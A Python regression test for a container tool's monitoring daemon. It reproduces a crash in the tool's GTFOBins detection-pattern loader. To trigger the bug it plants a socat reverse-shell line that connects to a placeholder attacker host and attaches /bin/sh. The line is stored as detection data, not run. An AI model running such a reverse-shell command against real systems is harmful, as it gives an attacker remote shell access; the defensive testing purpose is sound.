"""
Repro for issue #505: panic "slice bounds out of range [:12] with length 11"
at session start when [monitoring] enabled = true.

Root cause: the host monitoring daemon's proc-event watcher loads the GTFOBins
exec-pattern DB at startup (ProcEventWatcher.Run -> loadExecPatterns), and
gtfobinsStripPlaceholders() panicked on the standard GTFOBins `socat` entry token
"tcp-connect:attacker.com:12345" — it computed `lower` once but reassigned `token`
inside the loop, so after the "attacker.com" match shortened the token to
"tcp-connect" (len 11), the "attacker" match's stale index (12) overran it
(token[:12]). The panic fires in a goroutine right after "monitoring started",
crashing the whole process — exactly the reporter's symptom. It only reproduces
when the GTFOBins DB is present (e.g. after `coi update-patterns`), which is why
it depends on the user's setup, not the dummy alone.

This test plants a minimal GTFOBins DB containing the triggering token, points
`[detection] gtfobins_dir` at it, enables monitoring, and starts a session — the
same code path runs for both a fresh `coi shell` and `coi shell --resume`
(patterns load at every session start). coi's stderr is captured to a file (the
panic + goroutine trace land there); the test asserts monitoring engaged and that
no slice-bounds panic occurred.
"""

import json
import os
import subprocess
import time
from pathlib import Path

from support.helpers import calculate_container_name
from support.monitoring import coi_session_logs

PANIC_MARKERS = ("slice bounds out of range", "panic:", "runtime error:")

# A minimal GTFOBins entry whose reverse-shell code contains the exact token that
# triggered #505. The loader tokenises the code and feeds each token to
# gtfobinsStripPlaceholders, so this reproduces the parse-time panic.
TRIGGER_GTFOBINS_SOCAT = """\
functions:
  reverse-shell:
  - code: |-
      socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
"""


def _write_trigger_gtfobins(base):
    """Create <base>/gtfobins/_gtfobins/socat with the triggering token."""
    gtfobins_dir = Path(base) / "gtfobins"
    bin_dir = gtfobins_dir / "_gtfobins"
    bin_dir.mkdir(parents=True, exist_ok=True)
    (bin_dir / "socat").write_text(TRIGGER_GTFOBINS_SOCAT)
    return gtfobins_dir


def _write_monitoring_config(gtfobins_dir):
    """Enable monitoring in trusted-scope config and point detection at the
    planted GTFOBins DB. Returns a restore() callable."""
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None
    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        f"""
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000

[monitoring.nft]
enabled = false

[detection]
gtfobins_dir = "{gtfobins_dir}"
sigma_dir = "{gtfobins_dir}/does-not-exist"
"""
    )

    def restore():
        if backup is not None:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()

    return restore


def _container_state(name):
    r = subprocess.run(
        ["incus", "list", name, "--format=json"], capture_output=True, text=True, timeout=20
    )
    if r.returncode != 0 or not r.stdout.strip():
        return "Unknown"
    try:
        items = json.loads(r.stdout)
    except json.JSONDecodeError:
        return "Unknown"
    return items[0].get("status", "Unknown") if items else "Unknown"


def test_monitoring_gtfobins_load_does_not_panic(
    coi_binary, cleanup_containers, workspace_dir, tmp_path
):
    """Starting a session with monitoring + a GTFOBins DB must not panic (#505)."""
    gtfobins_dir = _write_trigger_gtfobins(tmp_path)
    restore = _write_monitoring_config(gtfobins_dir)
    container_name = calculate_container_name(workspace_dir, 1)
    stderr_file = tmp_path / "coi-stderr.log"
    env = {**os.environ, "COI_USE_DUMMY": "1"}

    proc = None
    fd = open(stderr_file, "w")  # noqa: SIM115 - kept open for the subprocess
    try:
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(workspace_dir), "--slot", "1", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=fd,
            env=env,
        )

        # Wait for the container to come up OR the process to exit early (a panic
        # in the monitoring goroutine crashes the whole process).
        ready = False
        for _ in range(60):
            if proc.poll() is not None:
                break
            if _container_state(container_name) == "Running":
                ready = True
                break
            time.sleep(1)

        # Give the monitoring daemon's proc-watcher goroutine time to load the
        # GTFOBins DB (where the panic happens), then stop.
        time.sleep(6)
    finally:
        if proc is not None and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()
        fd.close()
        subprocess.run(
            [coi_binary, "container", "delete", container_name, "--force"],
            capture_output=True,
            timeout=30,
        )
        restore()

    # The monitors (and the GTFOBins load that panicked in #505) run in the
    # session supervisor, which writes to the session log rather than to coi
    # shell's stderr. Scan both, or a regression would pass unnoticed.
    stderr = stderr_file.read_text(errors="replace") + coi_session_logs(container_name)
    print("\n=== Coi stderr + session logs ===\n" + stderr + "\n=== end ===\n")
    lowered = stderr.lower()

    # The test only proves something if monitoring actually engaged.
    assert (
        "monitoring started" in lowered
        or ready
        or (proc is not None and proc.returncode is not None)
    ), f"monitoring did not appear to start; cannot validate #505.\nstderr:\n{stderr}"

    for marker in PANIC_MARKERS:
        assert marker not in lowered, (
            f"coi panicked while loading the GTFOBins DB under monitoring (issue #505).\n"
            f"Found {marker!r} in stderr:\n{stderr}"
        )
